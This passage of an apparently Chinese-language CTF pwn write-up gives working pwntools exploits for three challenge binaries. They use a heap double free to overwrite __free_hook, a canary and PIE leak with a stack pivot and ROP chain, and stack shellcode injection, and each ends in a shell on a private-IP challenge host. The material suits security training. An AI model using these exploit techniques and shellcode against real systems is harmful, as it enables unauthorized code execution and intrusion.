        else:
            gdb.attach(p)
        pause()
    #-------------------------------------    def sl(s):
        return p.sendline(s)
    def sd(s):
        return p.send(s)
    def rc(timeout=0):
        if timeout == 0:
            return p.recv()
        else:
            return p.recv(timeout=timeout)
    def ru(s, timeout=0):
        if timeout == 0:
            return p.recvuntil(s)
        else:
            return p.recvuntil(s, timeout=timeout)
    def sla(p,a,s):
        return p.sendlineafter(a,s)
    def sda(a,s):
        return p.sendafter(a,s)
    def debug(addr=''):
        gdb.attach(p,addr)
        pause()
    def getshell():
        p.interactive()
    def msg(msg,addr):
        log.warn(msg+"->"+hex(addr))
    #-------------------------------------    def new(size,name,call):
        ru("choice:")
        sl("1")
        ru("Please input the size of compary's name\n")
        sl(str(size))
        ru("please input name:\n")
        sd(name)
        ru("please input compary call:\n")
        sd(call)
    def free(idx):
        ru("choice:")
        sl("3")
        ru("Please input the index:\n")
        sl(str(idx))
    def show(size):
        ru("choice:")
        sl("2")
        ru("Please input the index:\n")
        sl(str(size))
    def exp1():
        new(0x18,"a"*8,"b"*8)
        new(0x100,"a"*8,"b"*8)
        new(0x100,"a"*8,"b"*8)
        #
        free(0)
        for x in range(8):
            free(1)
        new(0x100,"c"*8,"d"*8)#3
        show(3)
        ru("c"*8)
        libc.address = u64(p.recv(6).ljust(8,"\x00"))-88-8-0x10-libc.sym["__malloc_hook"]
        free_hook = libc.sym["__free_hook"]
        system = libc.sym["system"]
        msg("libc.address",libc.address)
        new(0x50,"a"*8,"b"*8)#4
        new(0x50,"a"*8,"b"*8)
        new(0x50,"a"*8,"b"*8)
        free(4)
        free(4)
        new(0x50,p64(free_hook),"b"*8)
        #piedebug(0)
        new(0x50,"/bin/sh\x00","b"*8)
        new(0x50,p64(system),"b"*8)
        #piedebug(0)
        free(7)
    #   ru("choice:")
    #   sl("3")
    #   print p.recv()
        getshell()
        pause()
    if __name__ == '__main__':
        bin_elf = "./pwn"
        elf = ELF(bin_elf)
        context.binary=bin_elf
        context.log_level = "debug"
        if sys.argv[1] == "r":
            p = remote("172.29.3.117",9999)
            libc = elf.libc
        elif sys.argv[1] == "l":
            libc = elf.libc
            p = process(bin_elf)
        exp1()
# pwn7
64位保护全开，本质上仍然是栈溢出漏洞，只不过是c++写的
由于保护全开，需要依次泄漏出canary，elf base，libc base
然后由于可溢出的字节太少，又需要一波栈迁移，但只需要把栈抬高即可，没必要用到bss
最后就常规rop调用system来getshell
漏洞点就主要在这里
exp
    #encoding:utf-8
    #!/upr/bin/env python
    from pwn import *
    def piedebug(addr):
        text_base = int(os.popen("pmap {}|awk '{{print $1}}'".format(p.pid)).readlines()[1],16)
        log.info("elf_base:{}".format(hex(text_base)))
        log.info("fake_heap:{}".format(hex(text_base + 0x202018)))
        #log.info("get_array:{}".format(hex(text_base + 0x202140)))
        if addr!=0:
            gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
        else:
            gdb.attach(p)
        pause()
    #-------------------------------------    def sl(s):
        return p.sendline(s)
    def sd(s):
        return p.send(s)
    def rc(timeout=0):
        if timeout == 0:
            return p.recv()
        else:
            return p.recv(timeout=timeout)
    def ru(s, timeout=0):
        if timeout == 0:
            return p.recvuntil(s)
        else:
            return p.recvuntil(s, timeout=timeout)
    def sla(p,a,s):
        return p.sendlineafter(a,s)
    def sda(a,s):
        return p.sendafter(a,s)
    def debug(addr=''):
        gdb.attach(p,addr)
        pause()
    def getshell():
        p.interactive()
    def msg(msg,addr):
        log.warn(msg+"->"+hex(addr))
    #-------------------------------------    def exp():
        name ="admin"
        new = ""
        for i in range(len(name)):
            new+=chr(ord(name[i])^i)
        #piedebug(0x0118A)
        ru("please input your name\n")
        sl(new)
        ru("do you want to get something???\n")
        sd("a"*0x19)
        ru("a"*0x18)
        canary = u64(p.recv(8))-0x61
        stack = u64(p.recv(6).ljust(8,"\x00"))-0x28
        msg("canary",canary)
        msg("stack",stack)
        ru("OK???\n")
        sd("b"*0x18+p64(canary))
        #pause()
        ru("I think you can do something now\n")
        pay = "c"*0x18+"a"*0x10+p64(canary)+"a"*8+"\xde\x50"#1/16
        #pay = "%7$p%8$p%9$p".ljust(0x18,"\x00")+p64(canary)*4+"\xa2\x11"#1/16
        sd(pay)
        #print p.recv()
        ru("do you want to get something???\n")
        sd("a"*0x21)
        ru("OK???\n")
        sd("b"*0x29)
        ru("a"*8)
        piebase = u64(p.recv(6).ljust(8,"\x00"))-0x1440
        msg("piebase",piebase)
        printf_got=elf.got["printf"]+piebase
        printf_plt=elf.plt["printf"]+piebase
        read_got=elf.got["read"]+piebase
        pop_rdi_ret=piebase+0x14a3
        leave_ret=piebase+0x10dc
        vul = piebase+0x10de
        msg("printf_got",printf_got)
        msg("printf_plt",printf_plt)
        msg("read_got",read_got)
        ru("I think you can do something now\n")
        gadget = "a"*0x8+p64(pop_rdi_ret)+p64(read_got)+p64(printf_plt)
        pay = gadget+p64(vul)+p64(canary)+p64(stack)+p64(leave_ret)
        sd(pay)
        libc.address = u64(p.recv(6).ljust(8,"\x00"))-libc.sym["read"]
        system = libc.sym["system"]
        msg("libc.address",libc.address)
        ru("do you want to get something???\n")
        #piedebug(0x11fe)
        sd("a"*0x8)
        ru("OK???\n")
        sd("b"*0x8)
        ru("I think you can do something now\n")
        gadget = "/bin/sh\x00"+p64(pop_rdi_ret)+p64(stack)+p64(system)
        pay = gadget+p64(0)+p64(canary)+p64(stack-0x10)+p64(leave_ret)
        sd(pay)
        getshell()
    if __name__ == '__main__':
        bin_elf = "./pwn"
        elf = ELF(bin_elf)
        context.binary=bin_elf
        context.log_level = "debug"
        #context.terminal=['tmux', 'splitw', '-h']
        if sys.argv[1] == "r":
            p = remote("172.29.3.118",9999)
            libc = elf.libc
        elif sys.argv[1] == "l":
            libc = elf.libc
            #取消aslr保护机制
            #p = process(bin_elf, aslr=0)
            #加入libc进行调试：
            #p = process(bin_elf,env = {"LD_PRELOAD": "../libc-2.23.so.i386"})
        while True:
            try:
                p = process(bin_elf)
                exp()
            except:
                p.close()
# pwn9
简单栈溢出，nx都没开，很明显，栈里面执行shellcode了
exp
    #encoding:utf-8
    #!/upr/bin/env python
    from pwn import *
    def sl(s):
        return p.sendline(s)
    def sd(s):
        return p.send(s)
    def rc(timeout=0):
        if timeout == 0:
            return p.recv()
        else:
            return p.recv(timeout=timeout)
    def ru(s, timeout=0):
        if timeout == 0:
            return p.recvuntil(s)
        else:
            return p.recvuntil(s, timeout=timeout)
    def sla(p,a,s):
        return p.sendlineafter(a,s)
    def sda(a,s):
        return p.sendafter(a,s)
    def debug(addr=''):
        gdb.attach(p,addr)
        pause()
    def getshell():
        p.interactive()
    def msg(msg,addr):
        log.warn(msg+"->"+hex(addr))
    #-------------------------------------    def exp():
        jmp = 0x08048554
        shellcode ='''
        xor    eax,eax
        push   eax
        push   0x68732f2f
        push   0x6e69622f
        mov    ebx,esp
        mov    ecx,eax
        mov    edx,eax
        mov    al,0xb
        int    0x80
        xor    eax,eax
        inc    eax
        int    0x80
        '''
        shellcode =asm(shellcode)
        shell="sub esp,0x28;call esp"
        shell =asm(shell)
        ru(">\n")
        pay = shellcode.ljust(0x24,"\x00")
        pay+= p32(jmp)
        pay+=shell
        #debug("b *0x8048554")
        sl(pay)
        getshell()
    if __name__ == '__main__':
        bin_elf = "./pwn"
        elf = ELF(bin_elf)
        context.binary=bin_elf
        context.log_level = "debug"
        #context.terminal=['tmux', 'splitw', '-h']
        if sys.argv[1] == "r":
            p = remote("172.29.3.120",9999)
            libc = elf.libc
        elif sys.argv[1] == "l":
            libc = elf.libc
            p = process(bin_elf)
        exp()